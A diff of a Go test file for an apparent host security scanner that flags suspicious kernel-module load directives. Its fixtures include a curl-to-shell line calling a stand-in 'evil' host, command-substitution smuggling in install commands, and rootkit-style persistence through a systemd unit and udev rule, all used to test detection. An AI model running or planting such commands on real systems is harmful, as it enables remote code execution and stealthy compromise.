@@ -42,14 +42,16 @@ install cramfs /bin/false
 install nf_conntrack /usr/sbin/modprobe --ignore-install nf_conntrack $CMDLINE_OPTS && \
 	/usr/sbin/sysctl --quiet --pattern 'net[.]netfilter[.]nf_conntrack.*' --system
 install adfs /usr/lib/module-init-tools/unblacklist adfs; /sbin/modprobe --ignore-install adfs
+remove iwlwifi (/sbin/lsmod | grep -o -e ^iwlmvm -e ^iwldvm -e ^iwlwifi | xargs /sbin/rmmod) && /sbin/modprobe -r mac80211
 install usb_storage /usr/bin/curl -s http://evil/x | sh
+remove evil_mod /etc/rk.sh
 options snd slots=1
 `
 	ins := parseModprobeConf(strings.NewReader(conf), "/etc/modprobe.d/x.conf")
-	if len(ins) != 4 {
-		t.Fatalf("got %d install directives: %+v", len(ins), ins)
+	if len(ins) != 6 {
+		t.Fatalf("got %d directives: %+v", len(ins), ins)
 	}
-	for i, want := range []bool{true, true, true, false} {
+	for i, want := range []bool{true, true, true, true, false, false} {
 		if got := benignInstall(ins[i].Command); got != want {
 			t.Errorf("benignInstall(%q) = %v, want %v", ins[i].Command, got, want)
 		}
@@ -59,6 +61,9 @@ options snd slots=1
 	}
 	if benignInstall("/tmp/true") {
 		t.Error("true from /tmp accepted")
+	}
+	if benignInstall("/bin/true $(insmod /etc/rk.ko)") || benignInstall("/bin/echo `id`") {
+		t.Error("command substitution inside benignInstall accepted")
 	}
 }
 
@@ -83,6 +88,8 @@ func TestCheckAutoload(t *testing.T) {
 	write("/etc/modules-load.d/ignored.txt", "not_a_conf\n")
 	write("/etc/modprobe.d/x.conf", "install cramfs /bin/true\ninstall dummy /tmp/run.sh\n")
 	write("/etc/rc.local", "#!/bin/sh\ninsmod /etc/intel_audio/intel_audio.ko\ninsmod /lib/modules/6.1.0/kernel/x.ko\n")
+	write("/etc/systemd/system/rk.service", "[Service]\nExecStart=-/sbin/insmod /opt/rk/stealth.ko\n")
+	write("/etc/udev/rules.d/99-rk.rules", `ACTION=="add", RUN+="/sbin/insmod /var/tmp/udev_rk.ko"`+"\n")
 
 	c := &Cell{root: root, release: "6.1.0"}
 	rec := core.NewRecorder(slog.New(slog.NewTextHandler(io.Discard, nil)))
@@ -93,8 +100,8 @@ func TestCheckAutoload(t *testing.T) {
 		got = append(got, f.Details["module"])
 	}
 	sort.Strings(got)
-	want := []string{"/etc/intel_audio/intel_audio.ko", "dummy"} // rootkit_mod: a name modprobe can't load
-	if n != 2 || strings.Join(got, ",") != strings.Join(want, ",") {
+	want := []string{"/etc/intel_audio/intel_audio.ko", "/opt/rk/stealth.ko", "/var/tmp/udev_rk.ko", "dummy"}
+	if n != 4 || strings.Join(got, ",") != strings.Join(want, ",") {
 		t.Errorf("got %d findings %v, want %v", n, got, want)
 	}
 }
